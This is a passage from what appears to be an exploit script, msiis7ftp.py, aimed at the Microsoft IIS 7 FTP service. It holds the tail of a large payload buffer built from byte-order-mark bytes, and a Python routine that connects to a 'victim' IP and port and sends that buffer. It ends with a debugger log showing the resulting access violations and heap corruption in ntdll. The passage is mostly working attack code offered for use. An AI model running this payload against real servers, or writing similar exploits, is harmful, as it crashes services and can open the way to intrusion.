"\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb"
"\xbf\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xfe"
"\xff\xfe\xff\xff\xef\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xff"
"\xef\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xef\xbb"
"\xbf\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xef\xbb"
"\xbf\xfe\xff\xef\xbb\xbf\xff\xef\xfe\xff\xef\xbb\xbf\xff\xef\xff"
"\xef\xfe\xff\xfe\xff\xfe\xff\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xfe"
"\xff\xff\xef\xfe\xff\xfe\xff\xff\xef\xff\xef\xfe\xff\xff\xef\xff"
"\xef\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xff\xef\xef\xbb"
"\xbf\xff\xef\xfe\xff\xff\xef\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xff"
"\xef\xef\xbb\xbf\xfe\xff\xff\xef\xff\xef\xff\xef\xff\xef\xff\xef"
"\xfe\xff\xef\xbb\xbf\xfe\xff\xff\xef\xff\xef\xff\xef\xfe\xff\xef"
"\xbb\xbf\xff\xef\xfe\xff\xfe\xff\xef\xbb\xbf\xff\xef\xfe\xff\xef"
"\xbb\xbf\xfe\xff\xff\xef\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xfe\xff"
"\xff\xef\xff\xef"
"\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xef\xbb\xbf"
"\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xfe\xff\xef"
"\xbb\xbf\xef\xbb\xbf\xfe\xff\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xff"
"\xef\xff\xef\xfe\xff\xff\xef\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xff"
"\xef\xff\xef\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb"
"\xbf\xff\xef\xff\xef\xfe\xff\xfe\xff\xfe\xff\xfe\xff\xff\xef\xfe"
"\xff\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xff\xef\xfe\xff"
"\xff\xef\xff\xef\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xff\xef"
"\xff\xef\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xef"
"\xbb\xbf\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xef"
"\xbb\xbf\xff\xef\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xfe"
"\xff\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xff\xef\xef\xbb"
"\xbf\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xfe\xff\xfe\xff\xfe\xff\xfe"
"\xff\xfe\xff\xff\xef\xff\xef\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xff"
"\xef\xef\xbb\xbf\xff\xef\xfe\xff\xef\xbb\xbf\xff\xef\xfe\xff\xff"
"\xef\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xfe"
"\xff\xef\xbb\xbf\xfe\xff\xff\xef\xfe\xff\xef\xbb\xbf\xff\xef\xff"
"\xef\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xfe\xff\xff\xef\xff\xef\xff"
"\xef\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xff\xef\xff\xef"
"\xef\xbb\xbf\xfe\xff\xff\xef\xef\xbb\xbf\xfe\xff\xff\xef\xef\xbb"
"\xbf\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xff\xef\xfe\xff\xef\xbb\xbf"
"\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xef\xbb\xbf"
"\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb"
"\xbf\xfe\xff\xff\xef\xfe\xff\xef\xbb\xbf\xfe\xff\xff\xef\xff\xef"
"\xff\xef\xff\xef\xef\xbb\xbf\xfe\xff\xff\xef\xef\xbb\xbf\xff\xef"
"\xfe\xff\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf")


def usage():
        print "usage  : ./msiis7ftp.py <victim_ip>  <victim_port>"
        print "example: ./msiis7ftp.py 192.168.1.22 21"

def main(): 
	if len(sys.argv) != 3:
    		usage()
        	sys.exit()

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	HOST = sys.argv[1]
	PORT = int(sys.argv[2])
	s.connect((HOST,PORT))
	data = s.recv(1024)
	print data
	print "[*] Sending Payload...\n"
	s.send(buf+'\r\n')
	print "[*] Closing Socket...\n"
	s.close()

if __name__ == "__main__":
    main()


------------------------------------------------------------------------------
ModLoad: 75500000 75516000   C:\Windows\system32\CRYPTSP.dll
ModLoad: 752a0000 752db000   C:\Windows\system32\rsaenh.dll
ModLoad: 72090000 720be000   C:\Windows\system32\mlang.dll
ModLoad: 75090000 7509b000   C:\Windows\system32\pcwum.DLL
ModLoad: 75a70000 75a7e000   C:\Windows\system32\RpcRtRemote.dll
(22c.c10): Break instruction exception - code 80000003 (first chance)
eax=7ffaf000 ebx=00000000 ecx=00000000 edx=779cd315 esi=00000000 edi=00000000
eip=77963574 esp=00ccfc38 ebp=00ccfc64 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\SYSTEM32\ntdll.dll - 
ntdll!DbgBreakPoint:
77963574 cc              int     3
0:012> g
(22c.31c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=0000003c ecx=0050291c edx=0000003b esi=005e5fc0 edi=00500000
eip=77986167 esp=00abf6b4 ebp=00abf794 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
ntdll!RtlPrefixUnicodeString+0x84c:
77986167 8b4814          mov     ecx,dword ptr [eax+14h] ds:0023:00000014=????????
0:006> g
(22c.31c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=005e5fc8 ebx=005e7fc8 ecx=b083ef27 edx=efb083ef esi=005e5fc0 edi=00500000
eip=77986030 esp=00abf674 ebp=00abf69c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
ntdll!RtlPrefixUnicodeString+0x715:
77986030 8b4904          mov     ecx,dword ptr [ecx+4] ds:0023:b083ef2b=????????
0:006> g
Critical error detected c0000374
(22c.31c): Break instruction exception - code 80000003 (first chance)
eax=00000000 ebx=00000000 ecx=77950805 edx=00abe7a9 esi=00500000 edi=00515520
eip=779f28e5 esp=00abe9fc ebp=00abea74 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
ntdll!RtlpNtMakeTemporaryKey+0x1a49:
779f28e5 cc              int     3
0:006> g
(22c.31c): Unknown exception - code c0000374 (first chance)
(22c.31c): Unknown exception - code c0000374 (!!! second chance !!!)
eax=00abea0c ebx=00000000 ecx=77950805 edx=00abe7a9 esi=00500000 edi=00515520
eip=779f2913 esp=00abe9fc ebp=00abea74 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!RtlpNtMakeTemporaryKey+0x1a77:
779f2913 eb12            jmp     ntdll!RtlpNtMakeTemporaryKey+0x1a8b (779f2927)
0:006> g
WARNING: Continuing a non-continuable exception
(22c.31c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=0050299c ecx=00000011 edx=0000003b esi=00000000 edi=00000000
eip=7798c64e esp=00abf8a4 ebp=00abf974 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
ntdll!RtlTimeFieldsToTime+0x1d7:
7798c64e 8b4714          mov     eax,dword ptr [edi+14h] ds:0023:00000014=????????
0:006> g
(22c.31c): Access violation - code c0000005 (!!! second chance !!!)
eax=00000000 ebx=0050299c ecx=00000011 edx=0000003b esi=00000000 edi=00000000
eip=7798c64e esp=00abf8a4 ebp=00abf974 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
ntdll!RtlTimeFieldsToTime+0x1d7:
7798c64e 8b4714          mov     eax,dword ptr [edi+14h] ds:0023:00000014=????????
0:006> g
(22c.31c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=0050299c ecx=00000011 edx=0000003b esi=00000000 edi=00000000
eip=7798c64e esp=00abf8a4 ebp=00abf974 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
ntdll!RtlTimeFieldsToTime+0x1d7:
7798c64e 8b4714          mov     eax,dword ptr [edi+14h] ds:0023:00000014=????????
0:006> g
(22c.31c): Access violation - code c0000005 (!!! second chance !!!)
eax=00000000 ebx=0050299c ecx=00000011 edx=0000003b esi=00000000 edi=00000000
eip=7798c64e esp=00abf8a4 ebp=00abf974 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
ntdll!RtlTimeFieldsToTime+0x1d7:
7798c64e 8b4714          mov     eax,dword ptr [edi+14h] ds:0023:00000014=????????
